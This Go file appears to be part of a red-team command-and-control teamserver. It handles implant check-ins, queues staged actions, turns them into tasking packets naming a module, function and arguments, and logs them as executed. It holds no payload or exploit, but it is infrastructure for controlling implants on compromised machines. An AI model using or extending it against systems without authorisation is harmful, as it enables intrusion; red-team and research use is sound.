package comms

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/crud"
	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/model"
)

// ActionRequestHandler checks to see if there are any actions queued for the
// given implant.
func ActionRequestHandler(packet Packet) ([]Packet, error) {
	var allPackets []Packet

	// Check if implant has a uuid
	if packet.Implant.UUID == "" {
		return nil, fmt.Errorf("not registered")
	}

	_, err := d.UpdateCallBackTime(packet.Implant.UUID, time.Now().Format(crud.TimeStamp))
	if err != nil {
		return nil, fmt.Errorf("not registered")
	}

	stagedActions, err := d.GetStagedActionByImplant(packet.Implant.UUID)
	if err != nil {
		return nil, err
	}

	// If there are not actions, send nothing
	if len(stagedActions) == 0 {
		allPackets = append(allPackets, generateNoAction(packet.Implant))
		return allPackets, nil
	}

	for i := 0; i < len(stagedActions); i++ {
		// Check the time to see if its is ready to go out
		ttRun, _ := time.Parse(crud.TimeStamp, stagedActions[i].TimeToRun)
		tNow := time.Now().Format(crud.TimeStamp)
		t, _ := time.Parse(crud.TimeStamp, tNow)
		if ttRun.After(t) {
			continue
		}

		// Generate the action into a packet for the implant
		action, err := generateAction(stagedActions[i])
		if err != nil {
			continue
		}

		bytes, _ := json.Marshal(action)

		actionPacket := Packet{
			Fingerprint: "fingerprint",
			Implant:     packet.Implant,
			PacketType:  ActionEnum,
			NumLeft:     0,
			Data:        string(bytes),
		}

		allPackets = append(allPackets, actionPacket)

		// MOVE STAGED TO EXECUTED HERE
		d.DeleteStagedAction(stagedActions[i].Id)
		executed := model.ExecutedAction{
			Id:            stagedActions[i].Id,
			UUIDofImplant: stagedActions[i].UUIDofImplant,
			UUIDofAction:  stagedActions[i].UUIDofAction,
			TimeSent:      time.Now().Format(crud.TimeStamp),
		}
		d.InsertExecutedAction(executed)
	}

	// If there were no actions ready to be queued tell implant no actions
	if len(allPackets) == 0 {
		allPackets = append(allPackets, generateNoAction(packet.Implant))
	}

	return allPackets, nil
}

// generateNoAction returns a NoActionPacket for the server to send
func generateNoAction(implantInfo ImplantInfo) Packet {
	return Packet{
		Fingerprint: "fingerprint",
		Implant:     implantInfo,
		PacketType:  NoActionEnum,
		NumLeft:     0,
		Data:        "",
	}
}

// generateAction given a staged action, it will return a sendable action Packet
func generateAction(stagedAction model.StagedAction) (Action, error) {
	var action Action

	// Get the StoredAction from the database
	storedAction, err := d.GetStoredActionById(stagedAction.UUIDofAction)
	if err != nil {
		return action, err
	}

	// Get the Module that is being called
	module, err := d.GetModuleByName(storedAction.ModuleToRun)
	if err != nil {
		return action, fmt.Errorf("unknown module")
	}

	// Checks the modulefunc is there
	// TODO: Decide if this should be taken out.
	for i := 0; i < len(module.ModuleFuncIds); i++ {
		_, err := d.GetModuleFuncById(module.ModuleFuncIds[i])
		if err != nil {
			return action, fmt.Errorf("unknown modulefunc")
		}
	}

	action = Action{
		ActionID:   stagedAction.Id,
		Module:     storedAction.ModuleToRun,
		ModuleFunc: storedAction.ModuleFunc,
		Arguments:  storedAction.Arguments,
	}

	return action, nil
}
